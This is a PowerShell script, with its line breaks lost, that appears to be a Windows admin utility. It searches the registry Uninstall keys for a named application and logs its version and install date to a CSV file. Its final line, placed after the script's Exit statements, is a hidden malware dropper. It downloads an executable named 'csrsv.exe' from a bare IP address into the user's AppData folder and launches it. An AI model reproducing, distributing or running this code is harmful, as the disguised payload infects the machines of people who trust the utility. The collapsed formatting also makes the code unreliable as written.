[CmdletBinding()]param([ValidateNotNullOrEmpty()][string]$Application,[ValidateNotNullOrEmpty()][string]$LogFileName,[string]$LogFileLocation,[switch]$ExactFileName)function New-LogFile {[CmdletBinding()]param([ValidateNotNullOrEmpty()][string]$Log)$LogFile = Get-ChildItem -Path $LogFileLocation -Filter $LogFileName -ErrorAction SilentlyContinueWrite-Output "Log File Name: $LogFile"$Output = "LogFile Creation Date: " + $LogFile.CreationTimeWrite-Output $OutputIf ($LogFile -ne $null) {$OSInstallDate = Get-WmiObject Win32_OperatingSystem | ForEach-Object{ $_.ConvertToDateTime($_.InstallDate) -f "MM/dd/yyyy" }Write-Output "        OS Build Date: $OSInstallDate"If ($LogFile.CreationTime -lt $OSInstallDate) {Remove-Item -Path $LogFile.FullName -Force | Out-NullNew-Item -Path $Log -ItemType File -Force | Out-NullAdd-Content -Path $Log -Value "Application,Version,TimeStamp,Installation"}} else {New-Item -Path $Log -ItemType File -Force | Out-NullAdd-Content -Path $Log -Value "Application,Version,TimeStamp,Installation"}}Clear-HostIf (($LogFileName -eq $null) -or ($LogFileName -eq "")) {If ($LogFileName -notlike "*.csv*") {$LogFileName += ".csv"} else {$LogFileName = "$env:COMPUTERNAME.csv"}} elseIf ($LogFileName -notlike "*.csv*") {$LogFileName += ".csv"}If ($LogFileLocation[$LogFileLocation.Length - 1] -ne "\") {$File = $LogFileLocation + "\" + $LogFileName} else {$File = $LogFileLocation + $LogFileName}New-LogFile -Log $File$Uninstall = Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" -Force -ErrorAction SilentlyContinue$Uninstall += Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -Force -ErrorAction SilentlyContinueIf ($ExactFileName.IsPresent) {$ApplicationInstall = $Uninstall | ForEach-Object { Get-ItemProperty $_.PsPath } | Where-Object { $_.DisplayName -eq $Application }} else {$ApplicationInstall = $Uninstall | ForEach-Object { Get-ItemProperty $_.PsPath } | Where-Object { $_.DisplayName -like "*" + $Application + "*" }}If ($ApplicationInstall.length -gt 1) {$Size = 0for ($i = 0; $i -lt $ApplicationInstall.length; $i++) {If (([string]$ApplicationInstall[$i]).length -gt $Size) {$Size = ([string]$ApplicationInstall[$i]).length$Temp = $ApplicationInstall[$i]}}$ApplicationInstall = $Temp}If ($ApplicationInstall -ne $null) {$InstallDate = (($ApplicationInstall.InstallDate + "/" + $ApplicationInstall.InstallDate.substring(0, 4)).Substring(4)).Insert(2, "/")$Output = $ApplicationInstall.DisplayName + "," + $ApplicationInstall.Version + "," + $InstallDate + "," + "Success"Add-Content -Path $File -Value $OutputWrite-Host "Exit Code: 0"Exit 0} else {$Output = $Application + "," + "," + "," + "Failed"Add-Content -Path $File -Value $OutputWrite-Host "Exit Code: 1"Exit 1}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")